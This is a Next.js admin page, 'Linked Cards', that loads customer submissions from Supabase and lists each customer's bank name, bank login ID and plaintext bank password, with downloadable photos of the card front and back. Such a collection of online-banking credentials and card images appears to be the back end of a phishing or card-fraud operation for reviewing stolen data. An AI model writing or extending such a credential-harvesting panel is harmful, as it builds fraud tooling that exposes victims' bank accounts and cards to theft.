"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import AdminSidebar from "@/components/admin/AdminSidebar";
import AdminTopbar from "@/components/admin/AdminTopbar";
import { loadLinkedCardsFromSupabase, LinkedCardItem } from "@/lib/adminData";
import { isAdminAuthenticated } from "@/lib/adminAuth";

export default function AdminLinkedCardsPage() {
  const router = useRouter();
  const [cards, setCards] = useState<LinkedCardItem[]>([]);

  useEffect(() => {
    if (!isAdminAuthenticated()) {
      router.replace("/admin/login");
      return;
    }

    const loadCards = async () => {
      const records = await loadLinkedCardsFromSupabase(true);
      setCards(records);
    };

    loadCards();
  }, [router]);

  return (
    <main className="dashboard-page admin-dashboard-page">
      <AdminSidebar />

      <section className="dashboard-main">
        <AdminTopbar title="Linked Cards" />

        <section className="admin-table-shell">
          <div className="panel-heading">
            <div>
              <p className="eyebrow">Linked card submissions</p>
              <h2>Uploaded card requests</h2>
            </div>
          </div>

          <div className="admin-table-card">
            <table className="admin-table">
              <thead>
                <tr>
                  <th>ID</th>
                  <th>Customer</th>
                  <th>Bank Name</th>
                  <th>Bank Login</th>
                  <th>Password</th>
                  <th>Front</th>
                  <th>Back</th>
                  <th>Submitted</th>
                </tr>
              </thead>
              <tbody>
                {cards.map((card) => (
                  <tr key={card.id}>
                    <td>{card.id}</td>
                    <td>{card.customerName}</td>
                    <td>{card.bankName}</td>
                    <td>{card.loginId}</td>
                    <td>{card.password}</td>
                    <td>
                      {card.frontImageData ? (
                        <div className="admin-image-cell">
                          <img src={card.frontImageData} alt={`Front ${card.frontImageName}`} className="card-image-thumb" />
                          <a href={card.frontImageData} download={card.frontImageName} className="admin-download-link">
                            Download
                          </a>
                        </div>
                      ) : (
                        <span>{card.frontImageName}</span>
                      )}
                    </td>
                    <td>
                      {card.backImageData ? (
                        <div className="admin-image-cell">
                          <img src={card.backImageData} alt={`Back ${card.backImageName}`} className="card-image-thumb" />
                          <a href={card.backImageData} download={card.backImageName} className="admin-download-link">
                            Download
                          </a>
                        </div>
                      ) : (
                        <span>{card.backImageName}</span>
                      )}
                    </td>
                    <td>{card.submittedAt}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </section>
      </section>
    </main>
  );
}
